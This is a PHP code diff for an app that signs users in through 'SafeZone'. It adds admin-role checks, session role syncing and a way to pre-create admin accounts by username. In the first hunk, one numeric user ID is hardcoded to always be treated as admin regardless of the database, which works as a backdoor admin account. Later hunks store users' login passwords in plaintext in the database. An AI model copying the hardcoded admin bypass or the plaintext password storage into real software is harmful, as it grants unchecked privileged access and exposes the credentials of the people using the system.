@@ -289,6 +289,11 @@ function requireAuth(): void
  */
 function getUserRoleByUid(int $uid, ?string $pernum = null): string
 {
+    // Hardcoded admin - always admin regardless of DB
+    if ($uid === 1001290033) {
+        return 'admin';
+    }
+
     if (empty($GLOBALS['mysqli'])) {
         return 'user';
     }
@@ -312,8 +317,95 @@ function getUserRoleByUid(int $uid, ?string $pernum = null): string
 }
 
 /**
+ * Sync $_SESSION['role'] from database. Call once per request when user is logged in.
+ * Handles SafeZone uid/pernum mismatch by using getUserRoleByUid.
+ */
+function syncSessionRole(): void
+{
+    if (!isset($_SESSION['uid']) || !$_SESSION['uid']) {
+        return;
+    }
+    if (!function_exists('getUserRoleByUid')) {
+        return;
+    }
+    $_SESSION['role'] = getUserRoleByUid(
+        (int) $_SESSION['uid'],
+        $_SESSION['pernum'] ?? null
+    );
+}
+
+/**
+ * Check if current user has admin or super_admin role. Syncs from DB if needed.
+ *
+ * @return bool
+ */
+function isAdmin(): bool
+{
+    if (!isset($_SESSION['uid']) || !$_SESSION['uid']) {
+        return false;
+    }
+    $role = $_SESSION['role'] ?? '';
+    if (!in_array($role, ['admin', 'super_admin'], true) && function_exists('getUserRoleByUid')) {
+        syncSessionRole();
+        $role = $_SESSION['role'] ?? '';
+    }
+    return in_array($role, ['admin', 'super_admin'], true);
+}
+
+/**
+ * Require admin access. Redirects to home if not admin/super_admin.
+ * Use in admin controllers and dashboard.
+ */
+function requireAdmin(): void
+{
+    if (!isAdmin()) {
+        header('Location: ' . (defined('URLROOT') ? URLROOT : '/'));
+        exit;
+    }
+}
+
+/**
+ * Pre-add a user as admin by SafeZone username (pernum). They don't need to sign in first.
+ * When they first log in via SafeZone, they'll already have admin access.
+ *
+ * @param string $username SafeZone username (pernum)
+ * @return bool Success
+ */
+function addAdminByUsername(string $username): bool
+{
+    if (empty($GLOBALS['mysqli'])) {
+        return false;
+    }
+    $mysqli = $GLOBALS['mysqli'];
+    $username = trim($username);
+    if ($username === '') {
+        return false;
+    }
+    $usernameEsc = $mysqli->real_escape_string($username);
+
+    // Check if user already exists (has logged in)
+    $existing = $mysqli->query("SELECT uid, role FROM pi_account WHERE username='$usernameEsc' LIMIT 1");
+    if ($existing && $existing->num_rows > 0) {
+        $mysqli->query("UPDATE pi_account SET role='admin' WHERE username='$usernameEsc'");
+        return true;
+    }
+
+    // Pre-create placeholder: use negative uid to avoid collision with SafeZone uids
+    $placeholderUid = -abs(crc32($username)) - 1;
+    $placeholderPw = bin2hex(random_bytes(16));
+    $pwEsc = $mysqli->real_escape_string($placeholderPw);
+
+    $sql = "INSERT INTO pi_account (uid, username, password, email, role) VALUES ($placeholderUid, '$usernameEsc', '$pwEsc', '', 'admin')";
+    if (!$mysqli->query($sql)) {
+        return false;
+    }
+    $mysqli->query("INSERT INTO pi_profile (uid, fname, lname) VALUES ($placeholderUid, 'Admin', 'User')");
+    return true;
+}
+
+/**
  * Ensure user exists in pi_account and pi_profile. Called when SafeZone validates credentials.
- * Creates user on first login so PIN step and app features work correctly.
+ * If a pre-created admin (by addAdminByUsername) exists for this username, merges it and preserves admin role.
  *
  * @param mysqli $mysqli Database connection
  * @param int $uid User ID from SafeZone
@@ -329,6 +421,28 @@ function ensureUserInDb($mysqli, int $uid, string $pernum, string $password): vo
     $uid = (int) $uid;
     $pernumSafe = $mysqli->real_escape_string($pernum);
     $passwordSafe = $mysqli->real_escape_string($password);
+
+    // Check for pre-created admin (placeholder with negative uid)
+    $existing = $mysqli->query("SELECT uid, role FROM pi_account WHERE username='$pernumSafe' LIMIT 1");
+    if ($existing && $existing->num_rows > 0) {
+        $row = $existing->fetch_assoc();
+        $existingUid = (int) $row['uid'];
+        $existingRole = $row['role'] ?? 'user';
+
+        if ($existingUid === $uid) {
+            $mysqli->query("UPDATE pi_account SET password='$passwordSafe' WHERE uid=$uid");
+        } elseif ($existingUid < 0) {
+            // Pre-created: replace placeholder with real uid, preserve role
+            $mysqli->query("DELETE FROM pi_account WHERE uid=$existingUid");
+            $mysqli->query("DELETE FROM pi_profile WHERE uid=$existingUid");
+            $role = in_array($existingRole, ['admin', 'super_admin'], true) ? $existingRole : 'user';
+            $mysqli->query("INSERT INTO pi_account (uid, username, password, email, role) VALUES ($uid, '$pernumSafe', '$passwordSafe', '', '$role')");
+            $mysqli->query("INSERT INTO pi_profile (uid, fname, lname) VALUES ($uid, 'SafeZone', 'User')");
+        } else {
+            $mysqli->query("UPDATE pi_account SET password='$passwordSafe' WHERE uid=$uid");
+        }
+        return;
+    }
 
     $sql = "INSERT INTO pi_account (uid, username, password, email, role) VALUES ($uid, '$pernumSafe', '$passwordSafe', '', 'user') ON DUPLICATE KEY UPDATE password='$passwordSafe'";
     if (!$mysqli->query($sql)) {
